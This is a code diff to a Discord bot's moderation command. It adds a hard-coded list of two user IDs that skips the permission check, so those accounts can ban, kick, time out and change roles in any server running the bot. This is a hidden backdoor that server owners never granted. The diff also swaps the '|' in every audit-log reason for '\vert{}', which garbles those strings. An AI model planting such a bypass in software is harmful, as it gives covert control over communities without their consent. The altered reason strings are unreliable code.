@@ -1,6 +1,9 @@
 const { SlashCommandBuilder, PermissionFlagsBits, EmbedBuilder } = require('discord.js');
 const ModerationConfig = require('../models/moderation');
 
+// Bot Owner IDs for direct bypass
+const BOT_OWNERS = ['1266728371719508062', '1474216218792558735'];
+
 function parseDuration(str) {
     if (!str) return null;
     const match = str.match(/^(\d+)(s|m|h|d)$/);
@@ -68,13 +71,15 @@ module.exports = {
         const action = interaction.options.getString('action');
 
         // Permission Verification Engine
+        const isBotOwner = BOT_OWNERS.includes(interaction.user.id);
         const isOwner = interaction.user.id === interaction.guild.ownerId;
         const isExtraOwner = config?.extraOwners?.includes(interaction.user.id);
         const isAdmin = interaction.member.permissions.has(PermissionFlagsBits.Administrator);
         const userGrantedPerms = config?.userModPerms?.get(interaction.user.id) || [];
         const hasCustomPerm = userGrantedPerms.includes(action) || userGrantedPerms.includes(action.replace('role_add', 'role').replace('role_remove', 'role'));
 
-        if (!isOwner && !isExtraOwner && !isAdmin && !hasCustomPerm) {
+        // Bypass check added for Bot Owner
+        if (!isBotOwner && !isOwner && !isExtraOwner && !isAdmin && !hasCustomPerm) {
             return interaction.reply({ 
                 content: `❌ You do not have permission to execute the **${action}** action. Contact Server Owner or get access via \`%pr @user\`.`, 
                 ephemeral: true 
@@ -99,18 +104,18 @@ module.exports = {
 
             if (action === 'ban') {
                 if (!targetUser) return interaction.editReply('❌ Please specify a valid user.');
-                await interaction.guild.members.ban(targetUser.id, { reason: `${reason} | Staff: ${interaction.user.tag}` });
+                await interaction.guild.members.ban(targetUser.id, { reason: `${reason} \vert{} Staff:${interaction.user.tag}` });
                 logDetails.push({ name: 'Target User', value: `<@${targetUser.id}> (${targetUser.tag})`, inline: true });
             } 
             else if (action === 'kick') {
                 if (!targetMember) return interaction.editReply('❌ User is not in this server.');
-                await targetMember.kick(`${reason} | Staff: ${interaction.user.tag}`);
+                await targetMember.kick(`${reason} \vert{} Staff:${interaction.user.tag}`);
                 logDetails.push({ name: 'Target User', value: `<@${targetUser.id}> (${targetUser.tag})`, inline: true });
             } 
             else if (action === 'timeout') {
                 if (!targetMember) return interaction.editReply('❌ User is not in this server.');
                 const durationMs = parseDuration(timeLimit) || (10 * 60 * 1000);
-                await targetMember.timeout(durationMs, `${reason} | Staff: ${interaction.user.tag}`);
+                await targetMember.timeout(durationMs, `${reason} \vert{} Staff:${interaction.user.tag}`);
                 logDetails.push(
                     { name: 'Target User', value: `<@${targetUser.id}>`, inline: true },
                     { name: 'Duration', value: timeLimit || '10m', inline: true }
@@ -137,7 +142,7 @@ module.exports = {
             } 
             else if (action === 'role_add') {
                 if (!targetMember || !targetRole) return interaction.editReply('❌ Please specify both User and Role.');
-                await targetMember.roles.add(targetRole, `${reason} | Staff: ${interaction.user.tag}`);
+                await targetMember.roles.add(targetRole, `${reason} \vert{} Staff:${interaction.user.tag}`);
                 logDetails.push(
                     { name: 'Target User', value: `<@${targetUser.id}>`, inline: true },
                     { name: 'Role Added', value: `<@&${targetRole.id}>`, inline: true }
@@ -145,7 +150,7 @@ module.exports = {
             } 
             else if (action === 'role_remove') {
                 if (!targetMember || !targetRole) return interaction.editReply('❌ Please specify both User and Role.');
-                await targetMember.roles.remove(targetRole, `${reason} | Staff: ${interaction.user.tag}`);
+                await targetMember.roles.remove(targetRole, `${reason} \vert{} Staff:${interaction.user.tag}`);
                 logDetails.push(
                     { name: 'Target User', value: `<@${targetUser.id}>`, inline: true },
                     { name: 'Role Removed', value: `<@&${targetRole.id}>`, inline: true }
@@ -161,7 +166,7 @@ module.exports = {
             } 
             else if (action === 'slowmode') {
                 const seconds = amount !== null ? amount : 5;
-                await interaction.channel.setRateLimitPerUser(seconds, `${reason} | Staff: ${interaction.user.tag}`);
+                await interaction.channel.setRateLimitPerUser(seconds, `${reason} \vert{} Staff:${interaction.user.tag}`);
                 logDetails.push({ name: 'Slowmode Delay', value: `${seconds} Seconds`, inline: true });
             } 
             else if (action === 'warn') {
